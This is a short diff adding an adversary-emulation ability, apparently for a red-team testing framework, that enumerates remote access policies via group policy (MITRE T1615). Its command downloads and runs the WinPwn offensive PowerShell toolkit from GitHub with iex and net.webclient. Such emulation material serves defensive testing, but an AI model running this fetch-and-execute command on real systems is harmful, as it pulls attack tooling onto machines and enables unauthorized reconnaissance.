@@ -1,0 +1,13 @@
+- id: ade9c6f4-d7eb-59e2-a05f-24fc990983fa
+  name: Soumaia ART Tests - WinPwn - GPORemoteAccessPolicy
+  description: Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn
+  tactic: discovery
+  technique:
+    attack_id: T1615
+    name: Group Policy Discovery
+  platforms:
+    windows:
+      psh:
+        command: |-
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+          GPORemoteAccessPolicy -consoleoutput -noninteractive
